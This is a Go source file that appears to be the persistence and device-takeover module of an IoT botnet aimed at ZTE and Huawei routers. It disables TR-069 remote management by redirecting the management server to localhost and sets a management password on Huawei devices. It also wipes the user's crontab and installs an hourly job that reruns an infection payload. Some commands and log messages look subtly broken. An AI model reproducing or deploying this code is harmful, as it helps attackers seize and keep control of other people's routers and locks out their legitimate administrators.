package security

import (
	"bot/lib/modules/scanner"
	"bot/lib/utils"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func ExecuteGroup(Commands []string) int {
	success := 0
	for _, cmd := range Commands {
		cmds := strings.Split(cmd, " ")
		Err := exec.Command(cmds[0], cmds[1:]...).Run()

		if !utils.HandleError(Err) {
			success++
		}
	}

	return success
}

func PatchDevice() {
	// ZTE
	if utils.FolderExists("/usr/local/ct") {
		utils.Debug("[ZTE] Patching ZTE CVE2014-2321")
		os.Remove("/home/httpd/web_shell_cmd.gch")

		utils.Debug("[ZTE] Patching Tr-069..")
		success := ExecuteGroup([]string{
			"sendcmd 1 DB set MgtServer 0 Tr069Enable 1",
			"sendcmd 1 DB set PdtMiddleWare 0 Tr069Enable 0",
			"sendcmd 1 DB set MgtServer 0 URL http://127.0.0.1",
			"sendcmd 1 DB set MgtServer 0 UserName notitms",
			"sendcmd 1 DB set MgtServer 0 ConnectionRequestUsername notitms",
			"sendcmd 1 DB set MgtServer 0 PeriodicInformEnable 0",
			"sendcmd 1 DB save",
		})

		utils.Debug(fmt.Sprintf("[ZTE] Tr-069 patched, success: %d/7", success))
	} else {
		// Huawei
		utils.Debug("[Huawei] Patching InternetGatewayDevice & Passw..")
		success := ExecuteGroup([]string{
			"cfgtool set /mnt/jffs2/hw_ctree.xml",
			"InternetGatewayDevice.ManagementServer URL http://127.0.0.1",
			"cfgtool set /mnt/jffs2/hw_ctree.xml",
			"InternetGatewayDevice.ManagementServer ConnectionRequestPassword cometHere",
		})

		utils.Debug(fmt.Sprintf("[ZTE] Tr-069 patched, success: %d/7", success))
	}
}

func SetupCrontab() {
	exec.Command(`bash`, `-c`, fmt.Sprintf(`crontab -r;cat <(crontab -l) <(echo "%s") | crontab -`, fmt.Sprintf(`30 * * * * %s`, scanner.GetInfectionPayload(os.Args[1])))).Run()
	utils.Debug("[Cron] Installed tab, Success")
}

func Install() {
	SetupCrontab()
}
